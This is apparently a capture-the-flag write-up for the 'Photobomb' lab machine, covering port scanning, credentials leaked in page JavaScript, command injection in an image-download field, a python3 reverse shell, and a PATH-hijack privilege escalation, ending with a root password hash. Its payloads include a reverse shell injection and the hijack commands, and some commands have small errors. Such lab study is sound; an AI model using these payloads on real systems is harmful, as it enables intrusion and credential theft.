# Photobomb

Difficulty: Easy
OS: Linux
OSCP Like: No
Points: 20
Root Flag: No
Status: Not Reviewed
User Flag: No

# Photobomb

Photobomb 1
photobomb
Analysis of ports and services
Scan ports and services with NMAP

```bash
sudo nmap -Pn -T4 -A -sV -sC 10.129.14.72
Password:
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-05 20:21 EDT
Nmap scan report for photobomb.htb (10.129.14.72)
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/5%OT=22%CT=1%CU=32351%PV=Y%DS=2%DC=T%G=Y%TM=6366FE2
OS:8%P=arm-apple-darwin21.6.0)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550
OS:ST11NW7%O6=M550ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   30.32 ms 10.10.14.1
2   30.41 ms photobomb.htb (10.129.14.72)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.24 seconds
```

```bash
sudo nmap -Pn -T4 -A -sV -sC 10.129.14.72
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-05 20:23 EDT
Nmap scan report for photobomb.htb (10.129.14.72)
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/5%OT=22%CT=1%CU=33032%PV=Y%DS=2%DC=T%G=Y%TM=6366FEA
OS:1%P=arm-apple-darwin21.6.0)SEQ(SP=106%GCD=2%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550
OS:ST11NW7%O6=M550ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   29.61 ms 10.10.14.1
2   29.73 ms photobomb.htb (10.129.14.72)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.17 seconds
```

As usual check the WEB service on port 80

### HTTP service analysis

We can see that when visiting the link we are immediately redirected to the domain `photobomb.htb`

Photobomb 2

So add it to your hosts file.

We get the following when you visit the website.
Start by performing a path and directory discovery using your favorite tool, dirsearch, gobuster, or
feroxbuster.

```bash
feroxbuster -u [http://photobomb.htb/](http://photobomb.htb/) -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e

---

|__ |__ |**) |**) | / ` / \ \*/ | | \ |__
| |*__ | \ | \ | \**, \**/ / \ | |**/ |**_
by Ben "epi" Risher 🤓 ver: 2.7.0
──────────n't 🎯 Target Url │ [http://photobomb.htb/](http://photobomb.htb/) 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml
Photobomb 3
🔎 Extract Links │ true 🏁 HTTP methods │ [GET]
🔃 Recursion Depth │ 4 🎉 New Version Available │
[https://github.com/epi052/feroxbuster/releases/latest](https://github.com/epi052/feroxbuster/releases/latest)
──────────n't 🏁 Press [ENTER] to use the Scan Management Menu™
──────────n't
401 GET 7l 12w 188c [http://photobomb.htb/printer](http://photobomb.htb/printer)
200 GET 7l 27w 339c [http://photobomb.htb/photobomb.js](http://photobomb.htb/photobomb.js)
200 GET 22l 95w 843c [http://photobomb.htb/](http://photobomb.htb/)
200 GET 3l 22w 10990c [http://photobomb.htb/favicon.ico](http://photobomb.htb/favicon.ico)
401 GET 7l 12w 188c [http://photobomb.htb/printers](http://photobomb.htb/printers)
[####################] - 11s 4776/4776 0s found:5 errors:0
[####################] - 10s 4714/4714 445/s [http://photobomb.htb/](http://photobomb.htb/)
```

We begin to see interesting information, for example

```jsx
// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
		document.getElementsByClassName('creds')[0].setAttribute('href','[http://pH0t0:b0Mb!@photobomb.htb/printer](http://pH0t0:b0Mb!@photobomb.htb/printer)');
	}
}
window.onload = init;*
```

function init() {
*Here are some credentials you can use to be able to authenticate to [http://photobomb.htb/printer](http://photobomb.htb/printer)*

```markdown
*username:pH0t0
Password:b0Mb!*
```

### C*ommand Injection*

*Photobomb 4*

*Identify a command injection in the download of the images specifically in the filetype parameter.
To check this first listen to a tcpdump over the VPN interface*

```bash
*$ tcpdump -i utun7 -v
tcpdump: listening on utun7, link-type NULL (BSD loopback), snapshot length 524288 bytes
Now send a ping to the ip of the interface
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: [http://photobomb.htb](http://photobomb.htb/)
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: [http://photobomb.htb/printer](http://photobomb.htb/printer)
Upgrade-Insecure-Requests: 1
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;ping -c 4 10.10.14.117&dimensions=3000x2000
```

**Now see the result.

```bash
$ tcpdump -i utun7 -v
tcpdump: listening on utun7, link-type NULL (BSD loopback), snapshot length 524288 bytes
09:48:22.225896 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 64)
10.10.14.117.58042 > 10.129.55.6.http: Flags [S], cksum 0x27a5 (correct), seq 1843814184, win 65535, options [mss 1460,nop,wscale 6,nop
09:48:22.322779 IP (tos 0x0, ttl 63, id 0, offset 0, flags [DF], proto TCP (6), length 60)
10.129.55.6.http > 10.10.14.117.58042: Flags [S.], cksum 0x3105 (correct), seq 3614805631, ack 1843814185, win 65160, options [mss 1360
09:48:22.322825 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52)
10.10.14.117.58042 > 10.129.55.6.http: Flags [.], cksum 0x5585 (correct), ack 1, win 2064, options [nop,nop,TS val 4290840023 ecr 133405
09:48:22.323341 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 671)
10.10.14.117.58042 > 10.129.55.6.http: Flags [P.], cksum 0x02d3 (correct), seq 1:620, ack 1, win 2064, options [nop,nop,TS val 429084002
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: [http://photobomb.htb](http://photobomb.htb/)
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: [http://photobomb.htb/printer](http://photobomb.htb/printer)
Upgrade-Insecure-Requests: 1
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;ping -c 4 10.10.14.117&dimensions=3000x2000 [|http]
09:48:22.419559 IP (tos 0x0, ttl 63, id 63277, offset 0, flags [DF], proto TCP (6), length 52)
10.129.55.6.http > 10.10.14.117.58042: Flags [.], cksum 0x58d0 (correct), ack 620, win 505, options [nop,nop,TS val 133405670 ecr 429084
09:48:25.684488 IP (tos 0x0, ttl 63, id 19616, offset 0, flags [DF], proto ICMP (1), length 84)
10.129.55.6 > 10.10.14.117: ICMP echo request, id 1, seq 1, length 64
09:48:25.684521 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto ICMP (1), length 84)
10.10.14.117 > 10.129.55.6: ICMP echo reply, id 1, seq 1, length 64
09:48:26.685800 IP (tos 0x0, ttl 63, id 19855, offset 0, flags [DF], proto ICMP (1), length 84)
10.129.55.6 > 10.10.14.117: ICMP echo request, id 1, seq 2, length 64
09:48:26.685833 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto ICMP (1), length 84)
10.10.14.117 > 10.129.55.6: ICMP echo reply, id 1, seq 2, length 64
09:48:27.687901 IP (tos 0x0, ttl 63, id 20054, offset 0, flags [DF], proto ICMP (1), length 84)
10.129.55.6 > 10.10.14.117: ICMP echo request, id 1, seq 3, length 64
09:48:27.687942 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto ICMP (1), length 84)
10.10.14.117 > 10.129.55.6: ICMP echo reply, id 1, seq 3, length 64
09:48:28.689089 IP (tos 0x0, ttl 63, id 20248, offset 0, flags [DF], proto ICMP (1), length 84)
10.129.55.6 > 10.10.14.117: ICMP echo request, id 1, seq 4, length 64
09:48:28.689120 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto ICMP (1), length 84)
10.10.14.117 > 10.129.55.6: ICMP echo reply, id 1, seq 4, length 64
09:48:28.788465 IP (tos 0x0, ttl 63, id 63278, offset 0, flags [DF], proto TCP (6), length 513)
10.129.55.6.http > 10.10.14.117.58042: Flags [P.], cksum 0x46c2 (correct), seq 1:462, ack 620, win 505, options [nop,nop,TS val 13341203
HTTP/1.1 500 Internal Server Error
```

Photobomb 5

```bash
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 09 Oct 2022 14:48:23 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 67
Connection: close
Content-Disposition: attachment; filename=voicu-apostol-MWER49YaD-M-unsplash_3000x2000.jpg;ping -c 4 10.10.14.117
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Failed to generate a copy of voicu-apostol-MWER49YaD-M-unsplash.jpg [|http]
09:48:28.788474 IP (tos 0x0, ttl 63, id 63279, offset 0, flags [DF], proto TCP (6), length 52)
10.129.55.6.http > 10.10.14.117.58042: Flags [F.], cksum 0x3e21 (correct), seq 462, ack 620, win 505, options [nop,nop,TS val 133412039
09:48:28.788519 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52)
10.10.14.117.58042 > 10.129.55.6.http: Flags [.], cksum 0x1ed1 (correct), ack 462, win 2056, options [nop,nop,TS val 4290846489 ecr 1334
09:48:28.788541 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52)
10.10.14.117.58042 > 10.129.55.6.http: Flags [.], cksum 0x1ed0 (correct), ack 463, win 2056, options [nop,nop,TS val 4290846489 ecr 1334
09:48:28.789669 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52)
10.10.14.117.58042 > 10.129.55.6.http: Flags [F.], cksum 0x1ece (correct), seq 620, ack 463, win 2056, options [nop,nop,TS val 429084649
09:48:28.885951 IP (tos 0x0, ttl 63, id 63280, offset 0, flags [DF], proto TCP (6), length 52)
10.129.55.6.http > 10.10.14.117.58042: Flags [.], cksum 0x247c (correct), ack 621, win 505, options [nop,nop,TS val 133412136 ecr 429084
```

Perfect then create a reverse shell from [https://www.revshells.com/](https://www.revshells.com/) in python3
My payload would look like this, keep in mind that you have to change your RHOST and RPORT.

```bash
export RHOST="10.129.14.72";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

```bash
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: [http://photobomb.htb](http://photobomb.htb/)
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: [http://photobomb.htb/printer](http://photobomb.htb/printer)
Upgrade-Insecure-Requests: 1
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;export RHOST="10.129.14.72";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Now receive the reverse shell

```bash
$ pwncat -cs -lp 1337
/usr/local/lib/python3.10/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
'class': algorithms.Blowfish,
[09:54:15] Welcome to pwncat 🐈!
[09:54:49] received connection from 10.129.55.6:47636
[09:54:51] 0.0.0.0:1337: upgrading from /usr/bin/dash to /usr/bin/bash
[09:54:52] 10.129.55.6:47636: registered new host w/ db
(local) pwncat$ back
(remote) wizard@photobomb:/home/wizard/photobomb$id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
(remote) wizard@photobomb:/home/wizard/photobomb$
```

With this get `user.txt`

```bash
(remote) wizard@photobomb:/home/wizard/photobomb$ cd /home/wizard/
(remote) wizard@photobomb:/home/wizard$ ls
photobomb user.txt
(remote) wizard@photobomb:/home/wizard$ cat user.txt
4975a7925cdd49e4a11d536835a8483b
(remote) wizard@photobomb:/home/wizard$
```

Photobomb 6

### Privilege escalation and ROOT flag

When you run the sudo -l command you will see that the user has root permissions to `/opt/cleanup.sh` it uses the find command without
the absolute path so we can do a route hijack here:
So we can remove the root flag as follows.

```bash
echo "cat /root/root.txt" > find
chmod +x find
sudo PATH=pwd:$PATH /opt/cleanup.sh
```

Finally get `root.txt` flag

```bash
(remote) wizard@photobomb:/home/wizard$ echo "cat /root/root.txt" > find
(remote) wizard@photobomb:/home/wizard$ chmod +x find
(remote) wizard@photobomb:/home/wizard$ sudo PATH=pwd:$PATH /opt/cleanup.sh
239913b8e2c66d7644f99336129d552f
(remote) wizard@photobomb:/home/wizard$
root:$6$7MU2U.CeiY0WX91P$TUNn8zNu/XUPSgURRJbzYvnnawpZdGhsWiLSpVrm1cIx9Rev7V/yQ5x58gTy98zcXrv6RqlWRtXcbhEhTl3240:19251:0:99999:7:::
```